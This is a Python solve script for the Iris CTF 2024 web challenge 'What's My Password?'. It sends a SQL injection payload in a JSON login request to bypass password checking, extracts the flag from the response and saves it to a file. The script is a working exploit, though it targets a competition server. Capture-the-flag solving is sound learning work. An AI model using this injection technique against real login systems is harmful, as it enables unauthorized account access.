# File: solve.py
# Author: Juli√°n Casaburi
# Date: January 6, 2024
# Description: This is a script to solve the challenge "What's My Password? (Iris CTF 2024 - Web Exploitation)".

import urllib.request
from urllib.error import HTTPError, URLError
import json
import os
import time

MAX_RETRIES = 3
RETRY_DELAY = 2

def write_flag_to_file(flag, flag_file_path):
    with open(flag_file_path, 'w') as flag_file:
        flag_file.write(flag)
    print(f'[+] Flag written to {flag_file_path}')

def perform_request_with_retry(request, max_retries=3, retry_delay=2):
    for attempt in range(1, max_retries + 1):
        try:
            with urllib.request.urlopen(request) as response:
                response_data = response.read()
            return response_data.decode('utf-8')
        except (HTTPError, URLError) as e:
            print(f"[-] Attempt {attempt}: {type(e).__name__} - {e}")
            if attempt < max_retries:
                print(f"[!] Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
            else:
                raise

def main():
    try:
        payload = '{"username":"skat","password":"\\" OR username = \'skat\'\\""}'
        data = payload.encode('utf-8')

        url = 'https://whats-my-password-web.chal.irisc.tf/api/login'
        request = urllib.request.Request(url, data=data)

        print(f'[+] Performing request to {url}')
        response_text = perform_request_with_retry(request)

        print(f'[+] Response: {response_text}')

        flag = json.loads(response_text).get('password')
        print(f'[+] Flag: {flag}')

        # Write flag to file
        SOLVE_FILES_PATH = "./solve"
        os.makedirs(SOLVE_FILES_PATH, exist_ok=True)
        flag_file_path = os.path.join(SOLVE_FILES_PATH, "flag.txt")
        write_flag_to_file(flag, flag_file_path)

    except KeyboardInterrupt:
        print("\n[-] Script interrupted by user.")

    except Exception as e:
        print(f"[-] An unexpected error occurred: {str(e)}")

if __name__ == "__main__":
    main()
